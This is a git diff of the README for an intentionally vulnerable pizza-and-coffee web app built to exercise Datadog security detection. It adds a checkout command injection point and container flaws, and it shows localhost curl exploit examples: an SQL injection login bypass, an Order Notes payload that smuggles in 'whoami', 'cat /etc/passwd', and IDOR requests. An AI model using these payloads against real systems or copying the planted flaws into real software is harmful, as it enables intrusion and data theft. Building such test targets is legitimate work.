@@ -34,7 +34,9 @@ This application includes the following security vulnerabilities for testing:
 1. **SQL Injection** - Unparameterized queries throughout the application
 2. **Cross-Site Scripting (XSS)** - No input sanitization
 3. **Insecure Direct Object References (IDOR)** - Access control issues
-4. **Command Injection** - Admin panel allows arbitrary command execution
+4. **Command Injection** - Available in two locations:
+   - Admin panel allows arbitrary command execution
+   - **Checkout Order Notes field** (accessible to all authenticated users)
 5. **Sensitive Data Exposure** - Credit card data stored in plaintext
 6. **Broken Authentication** - Weak session management and insecure JWT implementation
 7. **Security Misconfiguration** - Insecure defaults
@@ -43,6 +45,8 @@ This application includes the following security vulnerabilities for testing:
 10. **Insecure Deserialization** - Unsafe object handling
 11. **Hardcoded Secrets** - JWT secret hardcoded as 'pizza123'
 12. **Vulnerable Dependencies** - Outdated packages with known CVEs
+13. **Container Security Issues** - Ubuntu base image with excessive tools and root user
+14. **Secrets in Filesystem** - Hardcoded credentials in `.secrets` and bash history
 
 ## 🛡️ Datadog Security Integration
 
@@ -53,8 +57,17 @@ This application includes the following security vulnerabilities for testing:
 - **IAST (Interactive Application Security Testing)**: Runtime vulnerability detection
 - **SCA (Software Composition Analysis)**: Dependency vulnerability scanning
 - **Workload Security**: Runtime security monitoring for containers and hosts
+- **Log-Trace Correlation**: Automatic correlation between logs and traces with Winston
+- **Source Code Integration**: Git metadata for linking errors to source code (DD_GIT_REPOSITORY_URL, DD_GIT_COMMIT_SHA)
 
-**📖 For detailed ASM setup instructions, see [ASM-SETUP.md](./ASM-SETUP.md)**
+**📖 Documentation:**
+- [ASM Setup Guide](./ASM-SETUP.md)
+- [Payment Validation & Custom ASM Events](./PAYMENT-VALIDATION-ASM.md)
+- [Testing ASM Events](./TESTING-ASM-EVENTS.md)
+- [Cloud Workload Security Testing](./CWS-TESTING.md)
+- [Log and Trace Correlation](./LOG-TRACE-CORRELATION.md)
+- [Command Injection (Checkout)](./COMMAND-INJECTION-CHECKOUT.md)
+- [Ubuntu Base Image Vulnerabilities](./UBUNTU-VULNERABILITIES.md)
 
 ### What Datadog Will Detect
 
@@ -67,6 +80,11 @@ This application includes the following security vulnerabilities for testing:
 - Suspicious system calls
 - Container runtime threats
 - Vulnerable dependencies
+- Container running as root
+- Excessive container tools (nmap, netcat, etc.)
+- Outdated system packages with CVEs
+- CIS Docker Benchmark violations
+- Secrets in container filesystem
 
 ### ASM Configuration Options
 
@@ -105,6 +123,11 @@ DD_API_KEY=your-datadog-api-key-here
 DD_SITE=datadoghq.com
 ```
 
+**⚠️ Important**:
+- Never commit `.env` files with real API keys to version control
+- All Datadog configuration is loaded from `.env` file - no keys are hardcoded
+- The `.env` file is already in `.gitignore` to prevent accidental commits
+
 ### 2.5. Verify ASM Configuration (Optional)
 
 Test that Datadog ASM is properly configured:
@@ -142,13 +165,24 @@ Password: admin123
 
 ### Build Image
 
+The build includes Git metadata for Datadog source code integration, allowing you to:
+- Link errors and traces directly to specific commits
+- Navigate from stack traces to exact code lines in your repository
+- Track changes and deployments in Datadog
+
 ```bash
-docker build -t insecure-pizza-coffee:latest .
+docker build -t insecure-pizza-coffee:latest . \
+  --build-arg DD_GIT_REPOSITORY_URL=$(git config --get remote.origin.url) \
+  --build-arg DD_GIT_COMMIT_SHA=$(git rev-parse HEAD)
 ```
 
 ### Run with Docker Compose
 
 ```bash
+# Set Git metadata for Datadog source code integration
+export DD_GIT_REPOSITORY_URL=$(git config --get remote.origin.url)
+export DD_GIT_COMMIT_SHA=$(git rev-parse HEAD)
+
 # Start all services
 docker-compose up -d
 
@@ -209,7 +243,9 @@ kubectl apply -f k8s/mysql-deployment.yaml
 kubectl wait --for=condition=ready pod -l app=mysql -n insecure-pizza-coffee --timeout=300s
 
 # Build and load Docker image (for local clusters)
-docker build -t insecure-pizza-coffee:latest .
+docker build -t insecure-pizza-coffee:latest . \
+  --build-arg DD_GIT_REPOSITORY_URL=$(git config --get remote.origin.url) \
+  --build-arg DD_GIT_COMMIT_SHA=$(git rev-parse HEAD)
 # For Minikube: minikube image load insecure-pizza-coffee:latest
 # For Kind: kind load docker-image insecure-pizza-coffee:latest
 
@@ -347,29 +383,63 @@ npm start
 ### SQL Injection
 
 ```bash
-# Login with SQL injection
-curl -X POST http://localhost:3000/auth/login \
+# Login with SQL injection (save cookies)
+curl -c cookies.txt -X POST http://localhost:3000/auth/login \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=admin' OR '1'='1&password=anything"
 
-# Search with SQL injection
-curl "http://localhost:3000/orders/menu?category=pizza' OR '1'='1"
+# Search with SQL injection (use saved cookies)
+curl -b cookies.txt "http://localhost:3000/orders/menu?category=pizza' OR '1'='1"
 ```
 
-### Command Injection (Admin Panel)
+### Command Injection
 
+#### Option 1: Admin Panel (Requires Admin Access)
 1. Login as admin
 2. Navigate to Admin Dashboard
 3. Execute system commands like `ls -la`, `cat /etc/passwd`
 
+#### Option 2: Checkout Order Notes (Any Authenticated User)
+```bash
+# Login as any user
+curl -X POST http://localhost:3000/auth/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -c cookies.txt \
+  -d "username=testuser&password=password123"
+
+# Add item to cart
+curl -X POST http://localhost:3000/orders/add-to-cart \
+  -H "Content-Type: application/json" \
+  -b cookies.txt \
+  -d '{"productId": 1, "quantity": 1}'
+
+# Exploit command injection in Order Notes
+curl -X POST http://localhost:3000/orders/place \
+  -H "Content-Type: application/json" \
+  -b cookies.txt \
+  -d '{
+    "deliveryAddress": "123 Test St",
+    "deliveryPhone": "555-1234",
+    "paymentMethod": "credit_card",
+    "notes": "\"; whoami; echo \""
+  }'
+```
+
+See [COMMAND-INJECTION-CHECKOUT.md](./COMMAND-INJECTION-CHECKOUT.md) for complete exploitation guide.
+
 ### IDOR (Insecure Direct Object Reference)
 
 ```bash
+# Login first to get session cookies
+curl -c cookies.txt -X POST http://localhost:3000/auth/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=admin123"
+
 # Access other users' orders
-curl "http://localhost:3000/orders/my-orders?userId=2"
+curl -b cookies.txt "http://localhost:3000/orders/my-orders?userId=2"
 
 # View any order
-curl "http://localhost:3000/orders/confirmation/1"
+curl -b cookies.txt "http://localhost:3000/orders/confirmation/1"
 ```
 
 ### Sensitive Data Exposure
@@ -384,11 +454,16 @@ The Print Order feature uses outdated libraries with known CVEs:
 # First, install the vulnerable packages (may be blocked by security tools)
 npm install pdfkit@0.11.0 handlebars@4.5.3
 
+# Login first
+curl -c cookies.txt -X POST http://localhost:3000/auth/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=admin123"
+
 # Navigate to My Orders and click "Print Order" button
 # This will trigger SCA detection in Datadog
 
 # Test IDOR vulnerability in print endpoint
-curl "http://localhost:3000/orders/print/1"  # Try different order IDs
+curl -b cookies.txt "http://localhost:3000/orders/print/1"  # Try different order IDs
 ```
 
 See [VULNERABLE-PACKAGES.md](./VULNERABLE-PACKAGES.md) for complete documentation on the vulnerable packages and CVEs.
